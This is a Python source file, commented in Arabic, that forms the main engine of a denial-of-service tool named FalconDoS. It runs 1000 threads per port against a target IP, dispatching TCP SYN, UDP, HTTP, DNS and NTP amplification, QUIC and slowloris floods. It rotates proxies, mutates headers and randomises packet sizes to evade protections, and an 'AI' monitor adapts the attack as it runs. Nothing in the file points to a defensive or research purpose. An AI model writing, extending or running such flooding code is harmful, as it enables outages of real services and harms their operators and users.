"""
attack_engine.py
----------------
المحرك الرئيسي لهجمات FalconDoS.
يدير توزيع الهجوم على عدة بروتوكولات ومنافذ،
ويدمج مع وحدات التخفي (header_mutator, proxy_rotator) ويستخدم الذكاء الصناعي لتعديل الهجوم.

الميزات:
- Multi-Port: دعم ضرب عدة منافذ في نفس الوقت
- Multi-Protocol: دعم بروتوكولات متعددة بالتوازي (TCP SYN, UDP, HTTP, DNS Amplification, ...)
- IP Rotation: يدعم تغيير الـ IP ديناميكياً عبر وحدات التخفي
- Dynamic Packet Size: توليد أحجام حزم عشوائية لتجاوز الحماية
- Threaded & Async: لتحقيق أقصى سرعة وأداء
- AI-Driven Adaptation: ذكاء صناعي لتحليل ردود الخادم وتكييف الهجوم
"""

import threading
import random
import time
from protocols import tcp_syn, udp_flood, http_flood, dns_amp, ntp_amp, quic_flood, slowloris
from stealth import header_mutator, proxy_rotator
from core import ai_analyzer

class AttackEngine:
    def __init__(self, target_ip, ports, protocols, threads_per_port=1000, duration=60):
        self.target_ip = target_ip
        self.ports = ports if isinstance(ports, list) else [ports]
        self.protocols = protocols  # أمثلة: ["TCP", "HTTP", "UDP", "SLOWLORIS"]
        self.threads_per_port = threads_per_port
        self.duration = duration
        self.threads = []
        self.running = True

    def start(self):
        """
        تبدأ الهجوم بتشغيل عدة threads لكل بروتوكول على كل منفذ.
        """
        print(f"[INFO] بدء الهجوم على {self.target_ip} | المنافذ: {self.ports} | البروتوكولات: {self.protocols}")

        for port in self.ports:
            for protocol in self.protocols:
                for _ in range(self.threads_per_port):
                    t = threading.Thread(target=self.attack_runner, args=(protocol, port))
                    t.daemon = True
                    t.start()
                    self.threads.append(t)

        # تشغيل خيط الذكاء الصناعي للمراقبة الديناميكية
        ai_thread = threading.Thread(target=self.ai_monitor)
        ai_thread.daemon = True
        ai_thread.start()

        # مدة التنفيذ
        time.sleep(self.duration)
        self.running = False

        # انتظار إنهاء جميع الخيوط
        for t in self.threads:
            t.join(timeout=1)

        print("[INFO] انتهى الهجوم.")

    def attack_runner(self, protocol, port):
        """
        تُنفذ في كل Thread وتبدأ الهجوم بناءً على البروتوكول المطلوب.
        """
        while self.running:
            # رؤوس عشوائية تستخدم للبروتوكولات التي تدعمها
            if protocol in ["HTTP", "QUIC", "SLOWLORIS"]:
                headers = header_mutator.random_headers()
            else:
                headers = {}

            # بروكسي أو IP ديناميكي
            ip_source = proxy_rotator.get_random_proxy()

            # حجم الحزمة عشوائي لتجنب أنظمة الحماية
            packet_size = random.randint(512, 4096)

            # تنفيذ الهجوم حسب البروتوكول
            if protocol == "TCP":
                tcp_syn.attack(self.target_ip, port, packet_size, ip_source)
            elif protocol == "UDP":
                udp_flood.attack(self.target_ip, port, packet_size, ip_source)
            elif protocol == "HTTP":
                http_flood.attack(self.target_ip, port, headers, ip_source)
            elif protocol == "DNS_AMP":
                dns_amp.attack(self.target_ip, port, packet_size, ip_source)
            elif protocol == "NTP_AMP":
                ntp_amp.attack(self.target_ip, port, packet_size, ip_source)
            elif protocol == "QUIC":
                quic_flood.attack(self.target_ip, port, headers, ip_source)
            elif protocol == "SLOWLORIS":
                slowloris.attack(self.target_ip, port, headers, ip_source)

            time.sleep(0.001)  # تأخير صغير لتوزيع الضغط

    def ai_monitor(self):
        """
        وحدة الذكاء الصناعي: تراقب ردود الخادم وتقرر إن كان يجب تعديل الاستراتيجية.
        """
        while self.running:
            change_needed = ai_analyzer.analyze(self.target_ip)
            if change_needed:
                print("[AI] تعديل استراتيجية الهجوم بناءً على ردود الهدف.")
                # 🔧 مكان مخصص لتوسعة المنطق لاحقًا:
                # مثال: تعطيل بروتوكولات معيّنة أو تقليل عدد Threads على منفذ معين
                # self.protocols.remove("UDP") أو تقليل threads_per_port على 443

            time.sleep(5)  # تحقق كل 5 ثوانٍ
